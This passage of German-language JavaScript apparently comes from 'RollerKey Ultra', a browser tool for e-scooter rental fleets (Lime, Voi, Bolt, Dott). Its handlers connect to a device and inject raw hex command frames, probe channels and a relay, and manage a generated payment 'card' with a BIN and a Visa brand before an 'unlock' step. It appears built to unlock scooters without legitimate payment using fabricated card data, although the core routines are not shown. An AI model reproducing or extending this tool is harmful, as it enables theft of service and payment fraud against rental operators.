  const v = $("iRaw").value.trim();
  if (!v) throw new Error("leer");
  if (!S.dev) await verbinde();
  const roh = /^[0-9a-f\s]+$/i.test(v) && v.replace(/\s/g, "").length % 2 === 0
    ? unhex(v) : new TextEncoder().encode(v.replace(/\\r/g, "\r").replace(/\\n/g, "\n"));
  await sende(roh, true);
  log("→ " + kurz(hex(roh), 60), "g");
}, 20000);

$("bShot").onclick = guard(async () => {
  if (!S.dev) await verbinde();
  for (let i = 0; i < S.chans.length && i < 4; i++){
    S.chan = S.chans[i];
    try {
      await handshake(); await sende(rahmen(0x1114), true);
      if (await warteAntwort(2000)){ stat("Kanal " + (i + 1) + " antwortet.", "ok"); log("Kanal " + (i + 1) + " nutzbar.", "g"); return }
      log("Kanal " + (i + 1) + " stumm.", "y");
    } catch(e){ log("Kanal " + (i + 1) + ": " + err(e), "y") }
  }
  S.chan = S.chans[0];
  stat("kein Kanal antwortet.", "warn");
}, 60000);

$("bNet").onclick = guard(async () => {
  log("Relay: " + kurz(relaySaeuber(S.relay || RELAY_STD), 60), "y");
  for (const u of [L + "/rider", L + "/v1/config"]){
    try { const r = await get(u, KOPF()); log("Netz " + kurz(u.replace("https://", ""), 34) + " · HTTP " + r.status, r.status < 500 ? "g" : "y") }
    catch(e){ log("Netz tot: " + err(e), "e") }
  }
  stat("Netzprüfung fertig.", "ok");
}, 40000);

$("bReset").onclick = guard(async () => {
  S.konten = { lime:null, voi:null, bolt:null, dott:null };
  S.karte = null; S.def = ""; S.block = []; S.offen = false; S.relay = RELAY_STD; S.betrag = 500;
  S.fahrt = { t0:0, base:0, timer:0, laeuft:false };
  ls("konten", S.konten); ls("block", []); ls("karte", null); ls("relay", S.relay); ls("betrag", S.betrag);
  $("log").innerHTML = ""; $("iRelay").value = S.relay;
  S.karte = karteBauen(); ls("karte", S.karte);
  malen(); stat("Zurückgesetzt.", "ok");
}, 20000);

/* Start */
function boot(){
  S.konten = lg("konten", S.konten) || S.konten;
  S.brand = lg("brand", "lime");
  S.auto = lg("auto", false);
  S.bin = lg("bin", "");
  S.marke = lg("marke", "visa");
  S.betrag = Math.min(20000, Math.max(100, +lg("betrag", 500) || 500));
  S.relay = relaySaeuber(lg("relay", RELAY_STD));
  S.karte = lg("karte", null) || karteBauen();
  ls("karte", S.karte);
  $("iRelay").value = S.relay;
  $("iBin").value = S.bin;
  malen();
  log("RollerKey Ultra bereit.", "g");
  log("Relay: " + kurz(S.relay, 52), "y");
  stat(konto() && konto().mail ? "Konto geladen." : "Bereit. Verbinden, dann entsperren.", "");
  if ("serviceWorker" in navigator) navigator.serviceWorker.register("sw.js").catch(() => {});
}

document.addEventListener("visibilitychange", () => { if (document.hidden) scanStop() });
boot();